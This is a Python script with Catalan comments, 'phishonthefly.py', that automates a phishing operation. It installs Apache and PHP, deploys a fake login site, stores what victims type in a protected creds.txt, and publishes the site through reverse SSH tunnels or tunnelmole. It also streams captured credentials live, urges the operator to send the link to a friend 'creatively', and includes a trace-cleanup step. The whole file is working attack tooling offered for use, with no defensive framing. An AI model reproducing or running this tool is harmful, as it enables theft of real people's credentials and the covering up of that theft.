#!/usr/bin/env python3

import os
import subprocess
import sys
import time
import shutil
import threading


# Funció per passar els arguments
def parse_arguments():
    if len(sys.argv) > 1 and sys.argv[1] in ('--help', '-h'):
        print("""Ús: sudo python3 ./phishonthefly.py <el_teu_nom> <port> <mètode_de_publicació>
        
        <el_teu_nom>                El vostre nom.
        <port>                      Port on Apache escoltarà. Es configura dinàmicament.
        <mètode de publicació>      Mètodes de publicació: serveo.net, localhost.run, tunnelmole
        
        Exemples:
        sudo python3 ./phishonthefly.py Paco 8123 serveo.net
        sudo python3 ./phishonthefly.py Bob 6969 localhost.run
        sudo python3 ./phishonthefly.py Jacobo 9876 tunnelmole
        
        Opcions:
        --help, -h                Mostra aquest missatge d'ajuda.
        man phishonthefly         Mostra el manual de l'aplicació""")
        sys.exit(0)
    elif len(sys.argv) != 4:
        print("Error: Nombre d'arguments incorrecte.")
        print("Per a més informació, utilitzeu '--help' o '-h'.")
        sys.exit(1)
    else:
        nom = sys.argv[1]
        port = int(sys.argv[2])
        publication_method = sys.argv[3]
        return nom, port, publication_method


# Funció per executar comandes a la shell amb control d'errors i interrupcions
def run_shell_command(command_list, cwd=None):
    try:
        subprocess.run(command_list, check=True, cwd=cwd)
    except subprocess.CalledProcessError as e:
        print(f"Error: La comanda {' '.join(e.cmd)} s'ha interromput amb el codi de sortida {e.returncode}")
    except FileNotFoundError:
        print("Error: La comanda no s'ha trobat.")
    except KeyboardInterrupt:
        print("\nInterrupció de l'usuari detectada. Sortint...")


# Configuració i preparació de l'entorn del lloc web
def setup_environment():
    print("Instal·lant Apache2 i PHP...")
    run_shell_command(["apt-get", "update", "-y"])
    run_shell_command(["apt-get", "install", "apache2", "php", "libapache2-mod-php", "-y"])
    run_shell_command(["apt-get", "install", "npm", "-y"])
    run_shell_command(["npm", "install", "-g", "tunnelmole", "-y"])


# Configura el VirtualHost d'Apache amb el port especificat i servername
def configure_apache(site_directory, port):
    vhost_content = f"""<VirtualHost *:{port}>
        ServerAdmin webmaster@localhost
        DocumentRoot {site_directory}
        ErrorLog ${{APACHE_LOG_DIR}}/error.log
        CustomLog ${{APACHE_LOG_DIR}}/access.log combined

        <Directory {site_directory}>
            Options Indexes FollowSymLinks MultiViews
            AllowOverride All
            Require all granted
        </Directory>
        <FilesMatch \\.php$>
            SetHandler application/x-httpd-php
        </FilesMatch>
    </VirtualHost>"""
    vhost_file = f"/etc/apache2/sites-available/phishonthefly.conf"
    with open(vhost_file, "w") as file:
        file.write(vhost_content)
    run_shell_command(["a2ensite", "phishonthefly.conf"])
    run_shell_command(["a2enmod", "rewrite"])
    run_shell_command(["a2dissite", "000-default.conf"])
    run_shell_command(["systemctl", "restart", "apache2"])


# Configura el directori del lloc web: còpia els arxius de la web i configura els permisos
def setup_site_directory(site_directory):
    print("Configurant directori del lloc web i ajustant els permisos...")
    os.makedirs(site_directory, exist_ok=True)
    run_shell_command(["cp", "-r", "sitefiles/.", site_directory], cwd=os.path.dirname(__file__))
    run_shell_command(["chmod", "+x", "./phishonthefly.py", "./install_manual.py", "./showcreds.sh", "./cleanup.sh"], cwd=os.path.dirname(__file__))
    run_shell_command(["chown", "-R", "www-data:www-data", site_directory])
    run_shell_command(["find", site_directory, "-type", "d", "-exec", "chmod", "755", "{}", ";"])
    run_shell_command(["find", site_directory, "-type", "f", "-exec", "chmod", "644", "{}", ";"])


# Protegeix l'arxiu de credencials capturades
def protect_sensitive_files(site_directory):
    creds_path = os.path.join(site_directory, "creds.txt")
    # Verifica si l'arxiu creds.txt existeix, sinó el crea buit
    if not os.path.exists(creds_path):
        with open(creds_path, "w") as file:
            pass  # Crea l'arxiu buit
    # Canvia la propietat de l'arxiu a www-data:www-data
    run_shell_command(["chown", "www-data:www-data", creds_path])
    # Especifica els permisos per a creds.txt
    run_shell_command(["chmod", "600", creds_path])

    #Creació de l'.htaccess
    htaccess_content = """
    <Files "creds.txt">
        Require all denied
    </Files>"""
    htaccess_path = os.path.join(site_directory, ".htaccess")
    with open(htaccess_path, "w") as file:
        file.write(htaccess_content)
    # Aplica els permisos corresponents
    run_shell_command(["chmod", "644", htaccess_path])


def modify_ports_conf(port):
    ports_conf_path = "/etc/apache2/ports.conf"
    try:
        with open(ports_conf_path, 'r+') as file:
            lines = file.readlines()
            listen_directive = f"Listen {port}\n"
            if listen_directive not in lines:
                # Afegeix la nova directiva Listen per al nou port
                file.write(listen_directive)
                print(f"Afegida la directiva Listen per al port {port} en {ports_conf_path}")
            else:
                print(f"La directiva Listen per al port {port} ja existeix en {ports_conf_path}")
    except FileNotFoundError:
        print(f"L'arxiu {ports_conf_path} no s'ha trobat.")


def backup_ports_conf():
    ports_conf_path = "/etc/apache2/ports.conf"
    backup_path = "/etc/apache2/ports.conf.bak"
    try:
        # Només fa backup si no existeix un préviament
        if not os.path.exists(backup_path):
            shutil.copy(ports_conf_path, backup_path)
            print(f"Backup de {ports_conf_path} creat en {backup_path}")
    except Exception as e:
        print(f"No s'ha pogut creat el backup de {ports_conf_path}. Error: {e}")


# Executa comanda dins d'un fil per anar mostrant credencials a mesura que s'introdueixen per mitjà del lloc web
def follow_creds_file():
    try:
        # Defineix els colors del text del stdout d'aquest fil
        red_start = "\033[91m"
        color_reset = "\033[0m"
        
        # Utilita Popen per capturar la sortida en temps real
        process = subprocess.Popen(["tail", "-f", "/var/www/phishonthefly/creds.txt"], stdout=subprocess.PIPE)
        
        # Imprime cada línea en rojo
        for line in iter(process.stdout.readline, b''):
            print(f"{red_start}{line.decode('utf-8').rstrip()}{color_reset}")
        process.stdout.close()
        process.wait()
    except subprocess.CalledProcessError as e:
        print(f"Error: La comanda {' '.join(e.cmd)} s'ha interromput amb el codi de sortida {e.returncode}")
    except FileNotFoundError:
        print("La comanda no s'ha trobat.")
    except KeyboardInterrupt:
        print("\nInterrupció de l'usuari detectada. Sortint...")


# Fil de la publicació web
def expose_website_thread(publication_method, port):
    try:
        if publication_method == "serveo.net":
            subprocess.run(["ssh", "-R", f"80:localhost:{port}", "serveo.net"], check=True)
        elif publication_method == "localhost.run":
            subprocess.run(["ssh", "-R", f"80:localhost:{port}", "nokey@localhost.run"], check=True)
        elif publication_method == "tunnelmole":
            subprocess.run(["tmole", str(port)], check=True)
        else:
            print("Mètode de publicació no suportat, introduzca: serveo.net, localhost.run o tunnelmole")
    except subprocess.CalledProcessError as e:
        print(f"Error: La comanda {' '.join(e.cmd)} s'ha interromput amb el codi de sortida {e.returncode}")
    except FileNotFoundError:
        print("La comanda no s'ha trobat.")
    except KeyboardInterrupt:
        print("\nInterrupció de l'usuari detectada. Sortint...")
        

# Junta els dos fils per l'execució simultània i mostra les sortides de les comandes a l'hora
def expose_website_with_creds_following(publication_method, port):
    run_shell_command(["systemctl", "restart", "apache2"])
    creds_thread = threading.Thread(target=follow_creds_file)
    website_thread = threading.Thread(target=expose_website_thread, args=(publication_method, port))
    
    creds_thread.start()
    website_thread.start()

    try:
        creds_thread.join()
        website_thread.join()
    except KeyboardInterrupt:
        print("\nInterrupció durant la captura de credencials o l'exposició de la web.")
        creds_thread.join()  # Assegura que el fil estigui tancat
        website_thread.join()  # Assegura que el fil estigui tancat
        print("Finalitzant els processos de manera segura...")
        raise  # Rellança l'excepció per gestionar-la al bucle principal; impedeix que es tanqui inesperadament...


def install_dos2unix_and_convert_files():
    print("Instal·lant dos2unix...")
    run_shell_command(["apt-get", "install", "dos2unix", "-y"])
    files_to_convert = ["phishonthefly.py", "install_manual.py", "showcreds.sh", "cleanup.sh"]
    for file in files_to_convert:
        print(f"Convertint {file} a format Unix...")
        run_shell_command(["dos2unix", file])

    
def main_menu(nom, port, publication_method):
    if os.geteuid() != 0:
        print("Aquest script ha d'ésser executat amb permisos de superusuari!")
        sys.exit(1)
    
    site_directory = "/var/www/phishonthefly"
    running = True

    while running:
        try:
            print(f"\nHola {nom}!")
            print("Menú Principal")
            print("1. Instal·la i configura l'entorn")
            print("2. Crea la web de phishing")
            print("3. Publica la web")
            print("4. Mostra les credencials capturades")
            print("5. Neteja les empremtes")
            print("6. Surt del programa")

            choice = input("Introdueix el número de la teva elecció i pressiona Enter: ")
            
            if choice == '1':
                print("Preparant l'entorn...")
                time.sleep(1)
                install_dos2unix_and_convert_files()
                setup_environment()
                backup_ports_conf()
                pass
            elif choice == '2':
                print("Creant el lloc web...")
                time.sleep(1)
                setup_site_directory(site_directory)
                configure_apache(site_directory, port)
                protect_sensitive_files(site_directory)
                modify_ports_conf(port)
                pass
            elif choice == '3':
                print("Exposant la web superxula!")
                print("Envia l'enllaç al teu amic de manera creativa :)")
                print("Capturant credencials...")
                expose_website_with_creds_following(publication_method, port)
            elif choice == '4':
                setup_site_directory(site_directory)
                protect_sensitive_files(site_directory)
                time.sleep(1)
                print("Credencials capturades:")
                run_shell_command(['./showcreds.sh'], cwd=os.path.dirname(__file__))
                pass
            elif choice == '5':
                print("Netejant...")
                time.sleep(1)
                run_shell_command(['./cleanup.sh'], cwd=os.path.dirname(__file__))
                pass
            elif choice == '6':
                print("Sortint del programa...")
                running = False
            else:
                print("Opció no vàlida, si us plau, intenta-ho de nou.")
        
        except KeyboardInterrupt:
            print("\nInterrupció detectada. Tornant al menú principal...")

if __name__ == "__main__":
    nom, port, publication_method = parse_arguments()
    main_menu(nom, port, publication_method)
    